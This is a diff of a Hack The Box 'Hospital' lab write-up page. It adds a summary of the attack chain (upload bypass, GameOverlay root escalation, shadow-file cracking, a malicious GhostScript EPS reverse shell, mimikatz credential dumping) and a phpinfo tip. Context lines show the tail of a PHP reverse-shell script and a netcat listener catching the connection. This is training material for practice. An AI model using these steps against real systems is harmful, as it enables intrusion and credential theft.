@@ -40,7 +40,7 @@
   <meta itemprop="description" content="A write-up for the Hospital box.">
   <meta itemprop="datePublished" content="2025-03-17T00:00:00+00:00">
   <meta itemprop="dateModified" content="2025-03-17T00:00:00+00:00">
-  <meta itemprop="wordCount" content="4358">
+  <meta itemprop="wordCount" content="4539">
   <meta itemprop="image" content="https://jordangalida.github.io/images/share.png">
   <meta itemprop="keywords" content="HTB,Pentesting">
 <meta name="referrer" content="no-referrer-when-downgrade" />
@@ -230,7 +230,9 @@
 </p>
 
 <content>
-  <p>Starting off with my usual <code>nmap</code> scans</p>
+  <p>This box starts out with a a strange <code>nmap</code> scan that shows both Windows and Linux, which we later find out that there is a Linux VM running on a Windows box. We find a file upload vulnerability, but only one type of PHP file extension executes code, and a lot of the execution functions are blocked. Eventually we find one that works, and gain initial access. We use the <code>GameOverlay</code> exploit to escalate permissions to root and crack the <code>drwilliams</code> user&rsquo;s password from <code>/etc/shadow</code>. We then log into the <code>roundcube</code> instance we found in the beginning and find an email from a <code>drbrown</code> requesting an <code>eps</code> file for <code>GhostScript</code>. We are able to create a malicious file that spawns a reverse shell and gain access to the Windows host. There are multiple ways to get admin access, but we notice that there is some script running to enter the admin&rsquo;s credentials into the <code>roundcube</code> instance so we use <code>mimikatz</code> to dump credentials from the credential manager.</p>
+<hr>
+<p>Starting off with my usual <code>nmap</code> scans</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sV -sC -p- 10.10.11.241 Scans/hospital_all
 </span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 12:22 EDT
 </span></span><span style="display:flex;"><span>Unable to split netmask from target expression: &#34;Scans/hospital_all&#34;
@@ -608,7 +610,8 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Failed to connect to </span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">:</span><span style="color:#e6db74">$port\n</span><span style="color:#e6db74">&#34;</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>We get back:</p>
+</span></span></span></code></pre></div><p><em>Note: You can also just do a <code>&lt;?php phpinfo(); ?&gt;</code> to see blocked functions</em></p>
+<p>We get back:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -nvlp <span style="color:#ae81ff">8888</span>
 </span></span><span style="display:flex;"><span>listening on [any] 8888 ...
 </span></span><span style="display:flex;"><span>connect to [10.10.14.51] from (UNKNOWN) [10.10.11.241] 6548
